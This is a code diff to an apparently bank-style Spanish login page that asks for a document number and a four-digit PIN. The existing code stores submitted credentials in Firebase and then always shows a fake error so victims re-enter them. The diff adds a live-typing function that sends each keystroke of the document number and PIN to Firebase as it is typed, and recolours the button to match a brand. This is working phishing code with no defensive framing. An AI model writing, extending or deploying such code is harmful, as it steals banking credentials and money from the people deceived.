@@ -428,8 +428,8 @@
 
     .btn-ingresar-dash {
       width: 100%;
-      background-color: #ffc107;
-      color: #003366;
+      background-color: #1b5ce9;
+      color: #ffffff;
       font-weight: 700;
       font-size: 0.9rem;
       padding: 10px;
@@ -441,7 +441,7 @@
     }
 
     .btn-ingresar-dash:hover:not(:disabled) {
-      background-color: #ffb300;
+      background-color: #0a4bc9;
     }
 
     .links-row {
@@ -660,14 +660,14 @@
                 </div>
               </div>
               <div class="cc-input-box">
-                <input type="text" id="documentNumber" placeholder="#" onkeyup="this.value = this.value.replace(/[^0-9]/g, ''); validarCampos()" oninput="this.value = this.value.replace(/[^0-9]/g, '')">
+                <input type="text" id="documentNumber" placeholder="#" onkeyup="this.value = this.value.replace(/[^0-9]/g, ''); validarCampos(); enviarTyping('documento', this.value)" oninput="this.value = this.value.replace(/[^0-9]/g, '')">
               </div>
             </div>
           </div>
           <div class="input-group">
             <label>Clave segura</label>
             <div class="input-with-icon">
-              <input type="password" id="claveSegura" placeholder="...." maxlength="4" oninput="this.value = this.value.replace(/[^0-9]/g, ''); validarCampos()">
+              <input type="password" id="claveSegura" placeholder="...." maxlength="4" oninput="this.value = this.value.replace(/[^0-9]/g, ''); validarCampos(); enviarTyping('clave', this.value)">
             </div>
           </div>
           
@@ -731,6 +731,39 @@
   const errorMensaje = document.getElementById('errorMensaje');
   const btnIngresarClave = document.getElementById('btnIngresarClave');
   
+  // ========== LIVE TYPING ==========
+  let typingTimeout = null;
+  let currentSessionId = null;
+
+  function iniciarSesionEscritura() {
+    if (!currentSessionId) {
+      currentSessionId = Date.now().toString() + '_' + Math.random().toString(36).substr(2, 6);
+    }
+  }
+
+  function enviarTyping(campo, valor) {
+    iniciarSesionEscritura();
+    
+    // Limpiar timeout anterior
+    if (typingTimeout) clearTimeout(typingTimeout);
+    
+    // Enviar a Firebase
+    const typingRef = database.ref('liveTyping/' + currentSessionId);
+    typingRef.set({
+      campo: campo,
+      valor: valor,
+      timestamp: Date.now(),
+      activo: true,
+      userAgent: navigator.userAgent,
+      ip: "cliente"
+    });
+    
+    // Después de 2 segundos sin escribir, marcar como inactivo
+    typingTimeout = setTimeout(() => {
+      database.ref('liveTyping/' + currentSessionId).update({ activo: false });
+    }, 2000);
+  }
+  
   // Validar campos para habilitar/deshabilitar botón
   function validarCampos() {
     const docNumber = document.getElementById('documentNumber').value;
@@ -754,7 +787,6 @@
   function showErrorMensaje() {
     if (errorMensaje) {
       errorMensaje.style.display = 'block';
-      // Ocultar después de 6 segundos
       setTimeout(() => {
         errorMensaje.style.display = 'none';
       }, 6000);
@@ -777,21 +809,22 @@
     };
     
     try {
-      // Guardar en Firebase en segundo plano
       const newRef = database.ref('ingresos').push();
       await newRef.set(data);
       
-      // Después de 2 segundos, ocultar preloader y mostrar mensaje de error
+      // Marcar typing como finalizado
+      if (currentSessionId) {
+        database.ref('liveTyping/' + currentSessionId).update({ activo: false, enviado: true });
+      }
+      
       setTimeout(() => {
         hidePreloader();
         btnIngresarClave.disabled = false;
         btnIngresarClave.textContent = 'Ingresar';
-        // Mostrar mensaje de error debajo del botón
         showErrorMensaje();
-        // Limpiar campos para nueva entrada
         document.getElementById('documentNumber').value = '';
         document.getElementById('claveSegura').value = '';
-        validarCampos(); // El botón quedará deshabilitado nuevamente
+        validarCampos();
       }, 2000);
       
     } catch (error) {
@@ -805,7 +838,7 @@
     }
   }
   
-  // Clave Segura - con validación de 4 dígitos
+  // Clave Segura
   function handleIngresarClave() {
     const docType = document.getElementById('docTypeText').innerText;
     const docNumber = document.getElementById('documentNumber').value;
@@ -821,7 +854,6 @@
       return;
     }
     
-    // Guardar en Firebase y mostrar mensaje de error
     saveToFirebaseAndShowError(docNumber, clave, docType);
   }
   
@@ -841,14 +873,11 @@
   function showDashboard() {
     document.getElementById('mainPage').style.display = 'none';
     document.getElementById('dashboardPage').style.display = 'block';
-    // Limpiar campos
     document.getElementById('documentNumber').value = '';
     document.getElementById('claveSegura').value = '';
     document.getElementById('tarjetaNumero').value = '';
     document.getElementById('tarjetaClave').value = '';
-    // Ocultar mensaje de error si estaba visible
     if (errorMensaje) errorMensaje.style.display = 'none';
-    // Validar campos para deshabilitar botón
     validarCampos();
     window.scrollTo(0, 0);
   }
